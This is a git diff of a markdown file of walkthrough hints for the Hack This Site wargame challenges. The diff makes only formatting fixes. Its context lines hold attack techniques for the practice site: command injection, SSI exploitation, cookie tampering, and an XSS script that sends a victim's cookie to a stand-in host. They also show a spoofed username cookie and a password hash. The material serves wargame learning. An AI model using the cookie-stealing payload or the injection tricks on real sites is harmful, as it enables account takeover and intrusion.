@@ -1,4 +1,4 @@
-# [Hack This Site](https://www.hackthissite.org/)
+# [Hack This Site](https://www.hackthissite.org)
 
 ## Basic
 
@@ -10,7 +10,7 @@
 5. (Javascript) Same as 4 + the URL referrer is checked by the server
     * Use javascript or Firefox console to modify the value of the element on the fly
     * or Same as 4 + spoof referrer using Firefox extension (RefControl)
-6. (Ascii) Simple encryption scheme where every character is shifted by 1,2,3,etc. (see Vigenère cypher)
+6. (Ascii) Simple encryption scheme where every character is shifted by 1,2,3,etc (see Vigenère cypher)
 7. (Unix) Append ls at the end of the command input to get the name of the password file
 8. (SSI) Notice how the file ends with .shtml, which allows the execution of shell commands
     * Don't forget to go up one level to get to the password file
@@ -48,7 +48,7 @@
     * Once we have the login name, we can create an account and login, then edit the cookie to switch the login name: document.cookie="accountUsername=GaryWilliamHunter";
     * The last part requires to change the "Clear personal files" button HTML value to "logFiles" in order to clear the system (and not personal) log files.
 9. (XSS, DT, Cookie)  We need to use a XSS vulnerability in the website messaging system to retrieve the login cookie of the boss, however it's beyond the scope of the exercise to actually implement the cookie stealer PHP script
-    * In order to do so, we can login using r-conner@crappysoft.com credentials and send a message to the boss using the following client-side scrit injection
+    * In order to do so, we can login using <r-conner@crappysoft.com> credentials and send a message to the boss using the following client-side scrit injection
     * `<script>window.location = "http://my.website.com/cookiesteal.php?c="+document.cookie</script>` => Get the cookie data and replace own cookie with it
     * document.cookie="strUsername=m-crap%40crappysoft.com;"
     * document.cookie="strPassword=94a35a3b7befff5eb2a8415af04aa16c";
